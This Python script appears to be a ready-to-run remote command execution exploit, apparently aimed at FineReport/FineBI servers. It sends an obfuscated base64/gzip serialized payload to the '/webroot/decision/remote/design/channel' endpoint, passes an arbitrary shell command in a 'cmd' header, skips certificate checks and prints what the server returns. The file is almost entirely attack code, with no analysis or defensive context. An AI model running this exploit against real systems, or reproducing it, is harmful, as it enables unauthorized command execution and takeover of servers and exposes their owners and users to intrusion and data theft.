import base64
import requests
from optparse import OptionParser

payload = base64.b64decode("H4sIAAAAAAAAAK1Ye3gcVRX/3X3NZLtJk23TMrwfBdJid1PatLKhlCYtsLBpQzc0hlTDZPcmGbo7s51Hs0EpivWtCIIo+EYgCgUp4LZQqMUnooIvlIcooiiKCH78gx/Qeu7MJrubLk/Jl+zeOfec33mfeyc7nkPQMjH/QnWrGnNsLRfrNTXD1OyJcx3u8Ksea7/z5VWX7vTDl0TA0i7iKYQzRr6gmqptmDbmpYRkXEjGu6fpncUCAB8Bn2SYozG1oGbGeIzk8oZuxYa5qgsBK9ZFq4rUQ5exS/ev+882H3w1WrZgG1gKcsE0Cty0J2xEPa05VR+Np21T00dJI2lb5LohyDGPvKBbtXhSt7huaba2lVeUjfs3Xbyp9+kHfUCxYKPZcOyCY/d6KjRujQfIAz9hJsiQmOXosSpPiirpiGm6zU1dzcWKVs7OxGxTLcb6eL6QU21uJem7oX/9ffqOm5f6EUqicUjTs1y31zn5YW4m0TREArqV43aS6MVBhIeGJ2yeMbLcsuEfHOwaRGgok1MteowOVnncLWidKQSHdDXPRXQCKbQMzfSgNjkVupccHKAfx3QVnfOq0jo6+vgKNxa0xYjuG+za8eL8l0Jy35NlcrTvgf1376XtZXghDD+OlfBvCcdLOIGh2eKmpuY2ctPSDP285BoGdjZDYzfl21Z1e6Oac3jwlqOvfPGKJ54/jSF0qqZrNi38bQs3MgS6yWuG2SlN5158+tThHFGiKSNDsCqB03OZGLDHNIthTtp2hvvKMexVJ3KGmmWIJHWdm26IODF1pCYswzMuXvB4LC8gZ6rZUW5bC+qgdDI0uMkZMcw8g9mWohqIUw3EqQbiXg3E3RqIT9VA3K2B+Jr1PZ2DdbnzuQqvZw81kxlPl5eqTXE7S9WzOW52ipDIWSPj5KleGBa/JfUkOubhkPtd/78xDOG1xQwvCJol4USGG99aPN7Qgqydj6/p61ld1KwkkdwB8s7EUCvDiTp4O1YwSOVYMqx+JyKZNhwzw8/QRBlHyhUYE00aQRizJLQxLH0bBctw+pvNiOnotpbn8dXDFpV4xp5CYpjrDgvNqBjvdtspbxZ5Cmm6WhiOegNfKEWnZnLlUdBcmXB9YyZXsxIW0QjJOKZJbeCRyMq2hamZjJ0RvAuLwzgJMYYmAvbIZ5qGU2BQ6ki4WyTWjiVC7OQa7euHL+QZW8IyMo/A3FlC46YGxpvBESzHijA68G6qFNtFtmQkaJLN4JRwKqkgsDWcJrrJs2doPEfeLG47+CSrVmPykRzZEnfZSd1pWBXGSpzOcOzBTKszGW5ZGmVtyoMuip/F7coGDc+28xdujGAN1obRjTOYd/TX0SbhLBrPo6IyTqi20sOusbJMiuBsnBNGEimK1uDBWZKwjsJEiOvo2JqZybLzEfTiXJGSDWQqL/KMjL6a5Hh8EkR7ZwzdVjWdknNYtYXdY6qZ5lscrmd458LzI3gPBsLox/kEOWbbBRmb6ASyVZNMkfE+OmUqshscXRd1L+ECwUMHzYJ2GcMyjmQ4ssK2zkg7mTE3TtPlLoGcaiTMtEMnrXtwRzAq6mMlxghsNGcMqzkZF9IcoKuMSIlhUrnkqGYr53RKsyhx1Dvubcs9IJMRFLBlFgzQGGptS75G6G3B4ZCEybfIGGeYRbZs4FaB5jaXMUGHGhF6uD1miIFRp/IOvmTUq0UPgVS+Hx8Qvl3McMhrcUm4hDzX9K3GZjFK6tTR4JssrQ/h0jA+iA97XpxF9cRNGR8hdzP5rIyPUWVp1tp8wZ5wY0ZZ/wQ+KbL+KZKgHkjbqu1QtD/D0FKBT9IIG+WmhM9SwPsGetfSbp0uvwKfa8DluFK0T1K0TxifDxPhatJqWDFxDZPxxdo6nbBsnpdwrZeH8vVrYkYz1Wn56Ub4Mr4SxpfwVQKwjZQxTrcausxG8HXRIP34BgV2nK6UxriMb5IdFIYYNYyMGxh8ceqbSSLGhzU9bo3J+DYRFxPx5in33WJLZ1RxW5JwS00Oe73q7HK0XFbsfodhXttgHbPdSOwM4zbczug9glrKFhVa7U4Zi/y5E98VnKWaBJS3Jez2JndSpzsswXOVLl7zp5DoUKraIKy7sSeMu3APmd1Wl8UzbW8Yt+J75Pqm1TLuoyPXsfgantPy4mLAcOJrp6I6PKTvB/ihgPoRFYDOi3YEPxFJuBX3e0dEF13cLVEcCwe7IngAPxMJ+jnDgqp3BtvIZ1Tbe8cadkZiQqZ7zNE3y3iQMkVXTW8sHv8G9TFVk7/Er0T3/ZrKQ+fjSfeenTlorE73z2/xsGD/HRlslQ2W8QgT93wJj1FOqg4nr3cj+IPX4E+QeVmjn14Kqbr+RKf6zDno8VcNwj/TAeC+iuma4Tra5YyMiH79CwVp3FRpBD9dZvFwqmT/ThVU97iW8I8Z50o5OhKepcFLDZ7Z3KMWyi8JR1SuHr3jlMST25cs6Vi6bMmKZe3L29vJidTrMnTiGPjoJYfspb9DEUSIviXxVgvZpdF9jT4jRInTN6Pv4KJdYDtdlkb6FAJgG9FE64jHgNl4XrxfYQ7mEpcQXiVeMwVtpuAmV/Bob7MsKFatmOeCUXvgEJJQaO3ZKGAPK8MmXWodWNWFXeRt1oU9HEeQhFgdiaNIfUWBjIVTTgcWUwDmk+nHTcLPUv6VuxEvYem6xSWcEu0sYXUioAQCJZypBIjUsw/rE0H/8lBrSAnuvc73ghJsDZ2ckBSJ3YjQpO8xRSohnZAVOXpeCYPXopFW73VXtHuP2D0lOlSDKmg9iQal4T6oLtfVSoPgytRyNZS5xFbW3ZrEoYmwSyhBo99psr+ekGDYXGaYm5jlAW1+PYlo/mAL9sFIRPzLG1sblchdoElxHXtYibQ23oWtPiSalCYhV6yVaxKQs5XZYusi/71YWcI2ZTYtOkrYnmj2Nj4aoI0Bf7Q/7e7SUwc9fZyetu9DvwgouwGzFLmET19DQWIblGYhdpkndjuucuWaPbk9uHygBffvwheEfH/0mt34WgnXRa+nRFwDJXQv+gn8xvRAIPqt9EBQkdOTmFem3iSoOzxqomUPbh3Yg9sGlJZduKOEXSXcuwv7ot8v4ccl/LSEXySi0Yd24zeJOcqcEn5PkZsTfTTkufI4IQnDBoKeeX9UGkKueUqUdoSNfmHhQFAslejeKXM9z570PFPmVDumNLgckzg3MTf6V6G3VWmN/i0wpVAoaQ1MKRHhbahFa62L5g+sPFxEFQ3bG9nk/uO9h7mTmJWYNymW2B5ik6827aT2uZ5OvjswgkfxDJ7FiG+F7ybfLXgKHf4W/1yiMTxHbfYIFP8BajIJQSbhnxKSEtZTV76C+RJOegWHSuj3vSL+59KhSRiZdwF9NB+gAdRUI0C8xEhMICSD5PdjGz15v76X0btBwr8O4FqaF68jNi1BzBIeBxGeehk9/wULvYRg6AANiRl20vqZQB06DT4fTTIxiI5BC32HyV8fjkMzGgo2AjR/zQJdWIvif1mNxf8BQw/AiJQUAAA=")


def execute(url,cmd):
    path = "/webroot/decision/remote/design/channel"
    headers = {"cmd":cmd}
    res = requests.post(url+path, headers=headers, data=payload, verify=False)
    print(res.text)

def usage():
    print("useage: python3 exploit.py -u http://127.0.0.1 -c whoami")

def main():
    usagestr = "\r\n[*] check vulnerabilities\r\npython3 exploit.py -u http://127.0.0.1 -c whoami"
    parser = OptionParser(usage=usagestr)
    parser.add_option("-u", dest="url", help="url address")
    parser.add_option("-c", dest="command", help="command to execute")
    (options, args) = parser.parse_args()
    if(options.url and options.command):
        execute(options.url,options.command)
    else:
        usage()
    

if __name__ == '__main__':
    main()